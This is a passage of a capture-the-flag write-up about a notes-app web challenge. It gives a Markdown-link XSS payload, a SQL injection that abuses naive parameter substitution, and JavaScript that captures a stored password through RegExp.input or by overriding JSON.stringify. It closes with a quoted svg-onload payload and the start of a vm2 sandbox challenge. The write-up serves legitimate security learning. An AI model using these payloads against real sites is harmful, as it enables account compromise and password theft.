      text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\*\*([^\n]+)\*\*</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">match<span class="token punctuation">,</span> p1</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;strong></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>p1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/strong></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\*([^\n]+)\*</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">match<span class="token punctuation">,</span> p1</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;em></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>p1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/em></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.note'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">;</span>
    document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.views'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> views<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The part that parses Markdown looks like it can be XSS:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\[([^\]]+)\]\(([^\)]+)\)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">match<span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p2</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;a href="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>p2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>p1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/a></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>Afterwards, the author said that he didn’t intend to leave a loophole here, but GitHub copilot wrote it out XD, but he thought it was interesting and left it.</p>
<p>This XSS loophole is not difficult to find:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> text <span class="token operator">=</span> <span class="token string">'[abc](123" onfocus=alert`1` autofocus=")'</span>
text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\[([^\]]+)\]\(([^\)]+)\)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">match<span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p2</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;a href="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>p2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>p1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/a></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>
<span class="token comment">// &lt;a href="123" onfocus=alert`1` autofocus="">abc&lt;/a></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>But the problem is, once you have XSS, how do you steal the password (which is the flag for this question)?</p>
<p>At the time, I couldn’t figure out how to steal the password, but after the competition, I saw the writeup and learned about a magical attribute: <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/input">RegExp.input</a>. This attribute can get the last input of the RegExp, for example:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">a</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'secret password'</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>RegExp<span class="token punctuation">.</span>input<span class="token punctuation">)</span> <span class="token comment">// secret password</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>And the password is the last input that was thrown into <code>/^[^$&#39;]+$/.test()</code>, so you can get the password through this. This is really mind-blowing.</p>
<p>But there is a detail here. If you use Markdown XSS, the regexp that is finally matched is not the password, so you can’t get it. At this point, you must find the server’s SQL injection. The code is as follows:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> db <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token function-variable function">prepare</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">query<span class="token punctuation">,</span> params</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>params<span class="token punctuation">)</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token punctuation">[</span>key<span class="token punctuation">,</span> value<span class="token punctuation">]</span> <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> clean <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">['$]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        query <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">'</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>clean<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">'</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> query<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">query<span class="token punctuation">,</span> params</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> prepared <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">prepare</span><span class="token punctuation">(</span>query<span class="token punctuation">,</span> params<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> database<span class="token punctuation">.</span><span class="token function">prepare</span><span class="token punctuation">(</span>prepared<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token function-variable function">run</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">query<span class="token punctuation">,</span> params</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> prepared <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">prepare</span><span class="token punctuation">(</span>query<span class="token punctuation">,</span> params<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> database<span class="token punctuation">.</span><span class="token function">prepare</span><span class="token punctuation">(</span>prepared<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> id <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
db<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token string">'INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
  id<span class="token punctuation">,</span>
  username<span class="token punctuation">,</span>
  <span class="token literal-property property">note</span><span class="token operator">:</span> note<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[&lt;>]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  mode<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>It removes all single quotes and $, and then replaces all <code>:param</code>. You can use this feature to inject, for example (from DrBrix):</p>
<pre class="line-numbers language-none"><code class="language-none">&quot;username&quot;: &quot;a :note&quot;,
&quot;password&quot;: &quot;pass&quot;
&quot;note&quot;: &quot;, :mode, 0, 0) -- &quot;,
&quot;mode&quot;: &quot;actual note and xss&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>Let’s see what it looks like in the end:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">// 一開始是</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> notes <span class="token keyword">VALUES</span> <span class="token punctuation">(</span>:id<span class="token punctuation">,</span> :username<span class="token punctuation">,</span> :note<span class="token punctuation">,</span> :<span class="token keyword">mode</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment">// 接著假設 id 是 123，就會變成</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> notes <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'123'</span> :username<span class="token punctuation">,</span> :note<span class="token punctuation">,</span> :<span class="token keyword">mode</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment">// 再來 replace username，變成</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> notes <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">,</span> <span class="token string">'a :note'</span><span class="token punctuation">,</span> :note<span class="token punctuation">,</span> :<span class="token keyword">mode</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment">// 再來是 note，要注意的是兩個 note 都會被 replace</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> notes <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">,</span> <span class="token string">'a '</span><span class="token punctuation">,</span> :<span class="token keyword">mode</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">-- '', ', :mode, 0, 0) -- ', :mode, 0)</span>

<span class="token comment">// 最後是 mode，這時候我們已經可以控制 note 內容的值了，沒有任何限制</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> notes <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">,</span> <span class="token string">'a '</span><span class="token punctuation">,</span> <span class="token string">'payload'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">-- '', ', 'payload', 0, 0) -- ', :mode, 0)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Using this loophole, you can do XSS without relying on Markdown, and then use the magical attribute <code>RegExp.input</code> to get the password.</p>
<h3><span id="unexpected-solution">Unexpected solution</span></h3><p>The unexpected solution for this question is also super cool. You don’t need <code>RegExp.input</code> anymore. The feature used is this piece of code:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.note'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.views'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> views<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>You might expect that after inserting HTML, it will continue to execute and then execute the content inside the HTML, for example:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>y</span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    x<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;img src=x onerror=alert(window.y.innerText)>'</span>
    y<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">'updated'</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The displayed alert will be <code>updated</code>. The event of the img is indeed executed later, but if it is written like this, it will be different:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>y</span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    x<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;svg>&lt;svg onload=alert(window.y.innerText)>'</span>
    y<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">'updated'</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>If written like this, the content in <code>onload</code> will be executed before <code>y.innerText = &#39;updated&#39;</code>, so the content of the alert will be <code>hello</code>. This payload is also recorded in <a target="_blank" rel="noopener" href="https://github.com/terjanq/Tiny-XSS-Payloads">tinyXSS</a>:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- In chrome, also works inside innerHTML, even on elements not yet inserted into DOM --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span>&lt;svg/onload=eval(name)><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>So what can we do with this knowledge?</p>
<p>Let’s first organize the code that loads the notes. After simplification, it looks like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> note<span class="token punctuation">,</span> mode<span class="token punctuation">,</span> views <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/view'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
      username<span class="token punctuation">,</span>
      password<span class="token punctuation">,</span>
      <span class="token literal-property property">id</span><span class="token operator">:</span> params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.note'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">;</span>
  <span class="token comment">// 在底下這行執行之前，會先執行我們的 XSS payload</span>
  document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.views'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> views<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Now, if we can execute the code before the last line, we can do some interesting things.</p>
<p>We can first overwrite <code>document.querySelector</code>, and then overwrite <code>JSON.stringify</code>, like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function-variable function">querySelector</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function-variable function">stringify</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>After overriding, what can we do? After overriding, we can use <code>arguments.callee.caller</code> to access the outermost anonymous async function and then call it again! After calling it again, another request will be sent, and we can intercept the password by using <code>JSON.stringify</code>:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function-variable function">querySelector</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function-variable function">stringify</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>password<span class="token punctuation">)</span> <span class="token comment">// flag</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span><span class="token function">caller</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>This unexpected solution comes from <a target="_blank" rel="noopener" href="https://twitter.com/dr_brix">@dr_brix</a>, which is really cool. I never thought it could be done this way.</p>
<h2><span id="webx2fvm-calc2-solves">web&#x2F;vm-calc(2 solves)</span></h2><p>Adding a calculation function is a common type of problem in CTF. At first glance, it seems to be a VM escape, and the core code is as follows:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> NodeVM <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NodeVM</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">eval</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    <span class="token literal-property property">wasm</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    <span class="token literal-property property">wrapper</span><span class="token operator">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">strict</span><span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> calc <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>calc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">let</span> result<span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        result <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">return </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>calc<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">result</span><span class="token operator">:</span> <span class="token string">"There was an error running your calculation!"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> result <span class="token operator">!==</span> <span class="token string">"number"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">result</span><span class="token operator">:</span> <span class="token string">"Nice try..."</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> result <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The code that can get the flag is this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
